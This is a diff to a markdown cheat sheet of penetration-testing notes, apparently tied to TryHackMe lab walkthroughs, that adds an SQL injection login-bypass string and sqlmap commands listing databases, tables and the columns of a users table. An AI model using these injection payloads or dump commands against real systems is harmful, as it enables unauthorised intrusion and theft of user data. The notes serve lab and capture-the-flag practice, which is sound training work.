@@ -10,13 +10,14 @@
 
 **Examples**
 
-[sql-injection-lab.md](../../walkthroughs/tryhackme/sql-injection-lab.md "mention")[#sql-injection](../../walkthroughs/tryhackme/avengers-blog.md#sql-injection "mention")
+[sql-injection-lab.md](../../walkthroughs/tryhackme/sql-injection-lab.md "mention")[#sql-injection](../../walkthroughs/tryhackme/avengers-blog.md#sql-injection "mention")[gallery.md](../../walkthroughs/tryhackme/gallery.md "mention")
 
 ```
 a' or 1=1 -- -
 1 or 1=1-- -
 1' or '1'='1'-- -
 ' or 1=1--
+1' or '1'='1'-- -
 ```
 
 
@@ -75,7 +76,7 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 **Examples**
 
-[#sql](../../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")
+[#sql](../../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")[#sql-injection](../../walkthroughs/tryhackme/gallery.md#sql-injection "mention")
 
 **Kali**
 
@@ -83,9 +84,29 @@ ls /SecLists/Discovery/Web-Content/common.txt
 sqlmap -u http://$VICTIM/administrator.php --forms --dump
 ```
 
+Get databases
 
+**Kali**
 
+```
+sudo sqlmap -r request.req --dbs
+```
 
+Get tables
+
+**Kali**
+
+```
+sudo sqlmap -r request.req --current-db gallery_db --tables
+```
+
+Get fields for table users
+
+**Kali**
+
+```
+sudo sqlmap -r request.req --current-db gallery_db --tables -T users --columns
+```
 
 
 
